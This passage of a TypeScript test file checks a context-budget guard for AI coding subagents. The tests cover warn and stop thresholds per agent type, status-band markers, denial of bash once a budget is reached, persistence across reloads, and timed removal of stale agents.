  expect(await ctxGuard($, '')).toContain('subagent budgets: * warn 120k, stop 170k; Explore warn 120k, stop 150k, own stop message; Plan stop 170k')
  await subDone($, 'sub-1')
  expect(await bashBy($, 'sub-1')).toBeUndefined()
  const after = await peekSub($)
  expect(Object.keys(after.subagents ?? {})).toEqual(['sub-2'])
  expect(after.over).toBe(1)
  await subDone($, 'sub-2')
  expect((await peekSub($)).over).toBe(0)
  expect(await ctxGuard($, '')).toContain('subagents: none followed')
})

test('the band shows sub N! while an agent is past its warn', { plugins: [PEEK_SUB] }, async ($, on) => {
  fillBottom(on, { 'sub-1': 130_000 })
  const w = newWorld({ agents: [runningAgent('sub-1', 'general-purpose')] })
  writeConfig(w, BUDGETS)
  const { clock } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($, 'vscode')
  await step($, clock, 'sub-1')
  expect(w.statuses.at(-1)).toContain('sub 1!')
  await measure($, w, 200_000)
  expect(w.statuses.at(-1)).toContain('sub 1!')
  await subDone($, 'sub-1')
  expect(w.statuses.at(-1)).not.toContain('sub')
})

test('a stop survives a reload: the deny holds and no note is sent again', { plugins: [PEEK_SUB] }, async ($, on) => {
  const fills: Record<string, number> = { 'sub-1': 175_000, 'sub-2': 100_000 }
  fillBottom(on, fills)
  const w = newWorld()
  writeConfig(w, BUDGETS)
  const { session, clock } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($)
  await spawn($, 'sub-1', 'general-purpose')
  await spawn($, 'sub-2', 'Explore')
  await step($, clock, 'sub-1')
  await step($, clock, 'sub-2')
  expect((await peekSub($)).subagents?.['sub-1']?.step).toBe('stop')
  await start($)
  expect(await bashBy($, 'sub-1')).toContain('context budget 170k reached')
  await step($, clock, 'sub-1')
  expect(agentNotes(session, 'sub-1').length).toBe(1)
  expect((await peekSub($)).over).toBe(1)
  // The spawn's type is kept too: Explore's own stop, no list lookup.
  fills['sub-2'] = 151_000
  await step($, clock, 'sub-2')
  expect(agentNotes(session, 'sub-2').at(-1)).toContain('Budget 150k reached')
  expect(w.agentListCalls).toBe(0)
})

test('an agent not seen for hours is dropped by the band timer', { plugins: [PEEK_SUB] }, async ($, on) => {
  fillBottom(on, { 'sub-1': 175_000 })
  const w = newWorld({ agents: [runningAgent('sub-1', 'general-purpose')] })
  writeConfig(w, BUDGETS)
  const { clock } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($)
  await step($, clock, 'sub-1')
  await clock.advance(HOUR)
  expect(await bashBy($, 'sub-1')).toContain('context budget')
  await clock.advance(HOUR + 10 * 60 * 1000)
  expect(await bashBy($, 'sub-1')).toBeUndefined()
  expect((await peekSub($)).subagents).toEqual({})
})

test('no role, no budgets: no note, no deny, no lookup', async ($, on) => {
  fillBottom(on, { 'sub-1': 175_000 })
  const w = newWorld({ agents: [runningAgent('sub-1', 'general-purpose')] })
  writeConfig(w, BUDGETS)
  const { session, clock } = world(on, w)
  await start($)
  await step($, clock, 'sub-1')
  expect(agentNotes(session, 'sub-1')).toEqual([])
  expect(await bashBy($, 'sub-1')).toBeUndefined()
  expect(w.agentListCalls).toBe(0)
  expect(await ctxGuard($, '')).toContain('(no role: not applied)')
})

test('main-loop steps and denies are untouched by subagent budgets', async ($, on) => {
  fillBottom(on, { '': 175_000 })
  const w = newWorld({ limits: [{ kind: 'five_hour', percentUsed: 50 }] })
  writeConfig(w, { ...BUDGETS, roles: LEAD_BRAKE.roles })
  const { session, clock } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($)
  await step($, clock)
  expect(notes(session)).toEqual([])
  expect(await bashBy($)).toBeUndefined()
  expect(await agentDenied($)).toBeUndefined()
  expect(w.agentListCalls).toBe(0)
})
